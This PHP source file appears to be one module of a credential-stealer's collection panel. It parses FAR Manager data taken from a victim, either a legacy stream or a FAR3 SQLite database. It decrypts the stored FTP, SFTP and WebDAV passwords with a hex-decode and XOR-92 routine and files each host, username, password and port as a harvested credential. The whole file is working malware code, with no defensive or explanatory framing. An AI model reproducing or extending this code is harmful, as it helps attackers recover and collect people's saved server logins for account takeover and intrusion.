<?php
//ok
	class Module_far extends Module_
	{
		function Decrypt($Host, $User, $Password)
		{
			if (!strlen($Password))
				return '';

			$Password = hex2bin($Password);

			for ($i = 0; $i < strlen($Password); $i++)
				$Password[$i] = chr(ord($Password[$i]) ^ 92);

			$blen = ord($Password[2]);
			$bskip = ord($Password[3]);

			$Password = substr($Password, 4);
			$Password = substr($Password, $bskip);
			$PlainPassword = substr($Password, 0, $blen);

			$blen = strlen($Host) + strlen($User);
			if (substr($PlainPassword, 0, $blen) == $User.$Host)
				return substr($PlainPassword, $blen);
			
			return '';
		}
		
		function ProcessFAR3($Data)
		{
			if(!class_exists("SQLite3"))
				return;
		
			$FileDB = GetTempFile('far');
			if(!file_put_contents($FileDB, $Data))
				return FALSE;
			
			$db = new SQLite3($FileDB);
			if(!$db)
				return FALSE;
			
			$TotalElement = $db->querySingle('SELECT id FROM table_keys ORDER BY id DESC', TRUE);

			$ID = $TotalElement["id"] + 1;
			$Cnt = 3;
			if($ID > 2)
			{
				while($ID > $Cnt)
				{
					$Host = $User = $Pass = $Port = $Prot = '';
					
					$QueryH= $db->querySingle('SELECT value FROM table_values WHERE key_id='.$Cnt.' AND name = \'HostName\'', TRUE);
					if(isset($QueryH['value']))
					{
						$Host = Assign_($QueryH['value']);
						
						$QueryU = $db->querySingle('SELECT value FROM table_values WHERE key_id='.$Cnt.' AND name = \'UserName\'', TRUE);
						if(isset($QueryU['value']))
							$User = Assign_($QueryU['value']);
							
						$QueryPa = $db->querySingle('SELECT value FROM table_values WHERE key_id='.$Cnt.' AND name = \'Password\'', TRUE);
						if(isset($QueryPa['value']))
							$Pass = $this->Decrypt($Host, $User, Assign_($QueryPa['value']));
						
						$QueryPo = $db->querySingle('SELECT value FROM table_values WHERE key_id='.$Cnt.' AND name = \'PortNumber\'', TRUE);
						if(isset($QueryPo['value']))
							$Port = Assign_($QueryPo['value']);
						
						$QueryPr = $db->querySingle('SELECT value FROM table_values WHERE key_id='.$Cnt.' AND name = \'FSProtocol\'', TRUE);
						if(isset($QueryPr['value']))
							$Prot = strtolower(str_replace(array("%20(SCP)", "SCP"), array("", "SFTP"), Assign_($QueryPr['value'])));
						
						if($Prot == "webdav")
							$this->add_http($this->append_port($Host, $Port), $User, $Pass);
						else
							$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == "sftp") , $Port), $User, $Pass);
					}
					
					$Cnt++;
				}
			}
			
			$db->close();
			unlink($FileDB);
		}
			
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
					$stream = new Stream($Data);
					while(TRUE)
					{
						$Host	= $stream->getSTRING_();
						if($Host == NULL)
							break;
						$User 	= $stream->getSTRING_();
						$Pass	= $stream->getSTRING_();
						
						$this->add_ftp($Host, $User, $Pass);
					}
					$stream = NULL;
					
					break;
				case 1:
					$this->ProcessFAR3($Data);
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}